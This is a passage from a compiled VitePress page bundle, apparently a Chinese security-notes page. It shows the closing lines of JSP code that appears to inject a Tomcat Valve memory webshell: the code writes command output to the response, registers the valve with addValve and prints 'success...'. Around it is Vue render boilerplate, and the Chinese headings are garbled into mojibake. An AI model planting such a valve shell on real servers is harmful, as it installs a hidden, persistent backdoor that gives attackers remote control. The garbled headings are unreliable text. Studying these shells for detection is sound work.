<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">                response</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">getWriter</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">write</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(output);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">                response</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">getWriter</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">flush</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">            }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">        }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;">    }</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">    standardPipeline</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">addValve</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(valveBase);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">    out</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">println</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;success...&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">%&gt;</span></span></code></pre></div><h2 id="è´¡çŒ®è€…" tabindex="-1">è´¡çŒ®è€… <a class="header-anchor" href="#è´¡çŒ®è€…" aria-label="Permalink to &quot;è´¡çŒ®è€…&quot;">â€‹</a></h2>`,7),y=s("h2",{id:"æ–‡ä»¶å†å²",tabindex:"-1"},[n("æ–‡ä»¶å†å² "),s("a",{class:"header-anchor",href:"#æ–‡ä»¶å†å²","aria-label":'Permalink to "æ–‡ä»¶å†å²"'},"â€‹")],-1);function c(E,C,F,A,D,u){const h=a("NolebasePageProperties"),t=a("NolebaseGitContributors"),k=a("NolebaseGitChangelog");return d(),l("div",null,[o,i(h),g,i(t),y,i(k)])}const v=e(B,[["render",c]]);export{m as __pageData,v as default};
